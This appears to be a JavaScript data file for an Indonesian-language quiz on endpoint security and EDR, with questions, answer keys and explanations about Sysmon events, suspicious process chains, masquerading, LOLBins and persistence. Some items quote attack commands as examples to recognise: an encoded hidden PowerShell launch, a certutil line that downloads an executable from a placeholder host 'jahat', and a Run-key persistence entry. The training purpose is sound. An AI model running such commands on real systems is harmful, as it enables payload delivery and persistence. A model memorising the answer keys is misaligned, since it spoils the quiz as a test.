window.QUIZ_DATA = window.QUIZ_DATA || {};
window.QUIZ_DATA["08"] = {
  title: "Endpoint & EDR",
  pass: 80,
  questions: [
    { q: "Sysmon Event ID 1 sangat berharga bagi analyst karena memberi?",
      options: [
        "Hanya nama file",
        "Command line lengkap, hash, dan parent process dari proses yang dibuat",
        "Isi memori penuh",
        "Rekaman layar"
      ], answer: 1,
      explain: "Sysmon Event 1 (process creation) memberi Image, CommandLine, ParentImage, Hashes, User." },
    { q: "Pola parent→child mana yang PALING mencurigakan?",
      options: [
        "explorer.exe → winword.exe",
        "winword.exe → powershell.exe",
        "services.exe → svchost.exe (System32)",
        "explorer.exe → chrome.exe"
      ], answer: 1,
      explain: "Aplikasi Office yang memunculkan PowerShell menandakan macro jahat/eksekusi payload." },
    { q: "Perintah 'powershell -nop -w hidden -enc <base64>' mengindikasikan?",
      options: [
        "Update Windows normal",
        "PowerShell dijalankan tersembunyi dengan perintah yang disamarkan (encoded) — sangat mencurigakan",
        "Pembersihan disk",
        "Instalasi driver resmi"
      ], answer: 1,
      explain: "-w hidden (jendela tersembunyi), -nop (no profile), -enc (perintah base64) = penyamaran khas serangan." },
    { q: "Perbedaan mendasar EDR dengan antivirus signature tradisional?",
      options: [
        "EDR hanya memindai saat diminta",
        "EDR memantau terus-menerus berbasis perilaku + telemetri dan bisa merespon (isolasi host, kill process)",
        "AV lebih baik untuk zero-day",
        "EDR tidak bisa menghapus file"
      ], answer: 1,
      explain: "EDR = visibilitas kontinu + deteksi perilaku + respon (isolasi, kill, forensik), unggul untuk zero-day." },
    { q: "'process.name:\"svchost.exe\"' berjalan dari C:\\Users\\...\\Temp\\ patut dicurigai karena?",
      options: [
        "svchost memang biasa di Temp",
        "svchost asli hanya ada di C:\\Windows\\System32 — nama sah di lokasi salah = masquerading",
        "Temp adalah folder aman",
        "Itu file update resmi"
      ], answer: 1,
      explain: "Proses sistem bernama sah dari path non-standar (Temp) = teknik masquerading (penyamaran)." },
    { q: "Sysmon Event ID 3 berguna untuk mendeteksi?",
      options: [
        "Pembuatan file",
        "Koneksi jaringan oleh sebuah proses (mis. ke server C2)",
        "Perubahan registry",
        "Login user"
      ], answer: 1,
      explain: "Event 3 = network connection: proses mana connect ke IP/port mana — penting untuk deteksi C2." },
    { q: "Kenapa EDR lebih tahan terhadap malware zero-day daripada AV signature?",
      options: [
        "Karena EDR punya lebih banyak signature",
        "Karena EDR mendeteksi PERILAKU (IOA), bukan hanya hash yang harus sudah dikenal",
        "Karena zero-day tidak berbahaya",
        "Karena AV tidak bisa dipasang"
      ], answer: 1,
      explain: "Deteksi perilaku menangkap aktivitas jahat meski file-nya baru dan hash-nya belum dikenal." },
    { q: "Command line 'certutil -urlcache -f http://jahat/f.exe %TEMP%\\f.exe' adalah contoh?",
      options: [
        "Penggunaan sah certutil untuk sertifikat",
        "LOLBin — binary Windows sah disalahgunakan untuk mengunduh payload",
        "Perintah backup",
        "Pembersihan cache DNS"
      ], answer: 1,
      explain: "certutil (binary sah) disalahgunakan untuk download = Living-off-the-Land Binary (LOLBin)." },
    { q: "Registry key 'HKCU\\...\\CurrentVersion\\Run\\X = malware.exe' dipakai penyerang untuk?",
      options: ["Persistence (malware jalan otomatis saat login)", "Enkripsi data", "Menghapus log", "Mempercepat boot"],
      answer: 0,
      explain: "Run key = teknik persistence; program dijalankan otomatis tiap user login." },
    { q: "Membangun 'process tree' saat investigasi endpoint berguna untuk?",
      options: [
        "Menghitung jumlah file",
        "Memahami siapa memanggil siapa, merekonstruksi rantai serangan dari awal",
        "Mengurutkan file berdasarkan ukuran",
        "Mematikan semua proses"
      ], answer: 1,
      explain: "Pohon proses mengungkap urutan parent-child sehingga seluruh rantai serangan bisa direkonstruksi." }
  ]
};
